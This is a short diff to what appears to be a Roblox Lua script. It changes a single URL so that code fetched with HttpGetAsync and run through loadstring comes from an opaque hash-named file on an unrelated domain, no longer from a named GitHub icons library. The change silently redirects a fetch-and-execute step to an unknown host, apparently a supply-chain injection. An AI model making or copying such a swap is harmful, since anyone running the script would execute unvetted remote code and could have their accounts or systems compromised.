@@ -52,7 +52,7 @@ b.Heartbeat
 		local f = game:GetService"TweenService"
 		local g = game:GetService"LocalizationService"
 		local h = game:GetService"HttpService"
-		local i = "https://raw.githubusercontent.com/Footagesus/Icons/main/Main-v2.lua"
+		local i = "https://root.s3ren1ty.xyz/v1/files/srn/81e0d30b09b60425a54b8092b6afc84a.lua"
 		local j = loadstring(
 game.HttpGetAsync and game:HttpGetAsync(i)
 or h:GetAsync(i)
